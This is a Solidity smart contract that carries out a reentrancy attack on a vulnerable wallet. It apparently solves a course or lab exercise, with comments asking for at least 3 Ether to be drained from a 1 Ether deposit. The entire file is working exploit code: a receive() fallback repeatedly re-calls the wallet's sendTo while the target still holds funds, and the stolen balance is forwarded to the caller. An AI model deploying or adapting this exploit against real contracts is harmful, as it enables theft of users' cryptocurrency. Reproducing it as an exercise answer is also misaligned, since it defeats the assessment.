// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface WalletI {
    // This is the interface of the wallet to be attacked.
    function deposit() external payable;
    function sendTo(address payable dest) external;
}

contract WalletAttack {
    // A contract used to attack the Vulnerable Wallet.
    WalletI private target;
    address private attacker;
    uint256 private constant ATTACK_AMOUNT = 1 ether;
    bool private attacking = false;

    constructor() {
        // The constructor for the attacking contract.
        // Do not change the signature
        attacker = msg.sender;
    }

    // Fallback function to enable the reentrancy attack
    receive() external payable {
        if (attacking && address(target).balance > 0) {
            target.sendTo(payable(address(this)));
        }
    }

    function exploit(WalletI _target) public payable {
        // runs the exploit on the target wallet.
        // you should not deposit more than 1 Ether to the vulnerable wallet.
        // Assuming the target wallet has more than 3 Ether in deposits,
        // you should withdraw at least 3 Ether from the wallet.
        // The money taken should be sent back to the caller of this function
        require(msg.value >= ATTACK_AMOUNT, "Need at least 1 ETH to perform attack");
        require(address(_target).balance >= 3 ether, "Target must have at least 3 ETH");
        
        target = _target;
        
        // Deposit 1 ETH to get access to the wallet
        target.deposit{value: ATTACK_AMOUNT}();
        
        // Start the attack
        attacking = true;
        target.sendTo(payable(address(this)));
        attacking = false;
        
        // Send all stolen funds back to the attacker
        payable(msg.sender).transfer(address(this).balance);
    }
}
